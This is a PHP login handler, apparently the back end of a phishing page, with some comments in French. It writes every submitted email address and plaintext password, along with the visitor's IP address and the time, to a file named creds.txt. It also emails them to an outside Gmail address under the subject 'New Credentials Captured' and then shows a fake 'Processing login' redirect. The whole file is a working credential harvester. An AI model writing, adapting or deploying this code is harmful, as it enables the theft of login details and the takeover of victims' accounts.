<?php
// /var/www/html/login.php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
    $pass  = htmlspecialchars($_POST['pass'] ?? 'undefined');

    // Validation côté serveur
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Adresse email invalide !");
    }

    $log = sprintf("Email: %s | Password: %s | IP: %s | Time: %s\n",
        $email,
        $pass,
        $_SERVER['REMOTE_ADDR'],
        date("Y-m-d H:i:s")
    );

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);

    // Send email notification
    $to = "Credentials@gmail.com";
    $subject = "New Credentials Captured";
    $message = "Email: $email\nPassword: $pass\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nTime: " . date("Y-m-d H:i:s");
    $headers = "From: no-reply@yourdomain.com\r\n";

    mail($to, $subject, $message, $headers);

    // Redirection factice
    header('Location: http://10.0.0.1');
    echo "<html><body><h2>Processing login...</h2></body></html>";
    exit();
}
?>
